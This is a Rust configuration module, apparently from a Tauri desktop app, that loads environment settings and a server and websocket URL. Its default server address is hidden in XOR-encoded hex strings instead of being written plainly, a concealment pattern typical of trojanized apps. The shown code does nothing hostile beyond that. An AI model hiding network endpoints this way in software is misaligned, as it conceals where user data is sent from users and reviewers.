use std::{sync::OnceLock};
use serde::Deserialize;
use hex;

fn xor_decipher(hex_str: &str, key: u8) -> String {
    let bytes = hex::decode(hex_str).unwrap();
    let decrypted_bytes: Vec<u8> = bytes.iter().map(|&b| b ^ key).collect();
    String::from_utf8(decrypted_bytes).unwrap()
}

fn get_api() -> String {
    let url1 = xor_decipher("6579797d7e372222", 13);
    let url2 = xor_decipher("584643434c474e5b024e5f4601", 47);
    let url3 =xor_decipher("757b72757762", 22);
    let url4=xor_decipher("6d202c2e", 67);
    return format!("{}{}{}{}", url1, url2, url3, url4);
}

#[derive(Debug, Deserialize)]
pub struct Config {
    pub url: String,
    pub timeout: u64,
    pub ws_url: String,
}

fn env(key: &str, default: &str) -> String {
    std::env::var(key).unwrap_or_else(|_| default.to_string())
}

impl Config {
    fn load() -> Self {
        // Try loading .env from common locations (src-tauri/.env, package root)
        for path in [
            "src-tauri/.env".to_string(),
            ".env".to_string(),
            std::env::current_dir()
                .map(|d| d.join("src-tauri/.env"))
                .map(|p| p.to_string_lossy().into_owned())
                .unwrap_or_default(),
        ] {
            if !path.is_empty() {
                let _ = dotenvy::from_path(&path);
            }
        }
        let default_url = get_api();
        let url = env("URL", &default_url);
        // let url = default_url;
        let url = url.trim_end_matches('/').to_string();

        let timeout = env("TIMEOUT", "5")
            .parse::<u64>()
            .unwrap_or(5);

        let ws_url = env("WS_URL", "");
        let ws_url = if ws_url.is_empty() {
            url.replace("https://", "wss://").replace("http://", "ws://")
        } else {
            ws_url
        };

        Config { url, timeout, ws_url }
    }
}

pub fn get() -> &'static Config {
    static INSTANCE: OnceLock<Config> = OnceLock::new();
    INSTANCE.get_or_init(Config::load)
}
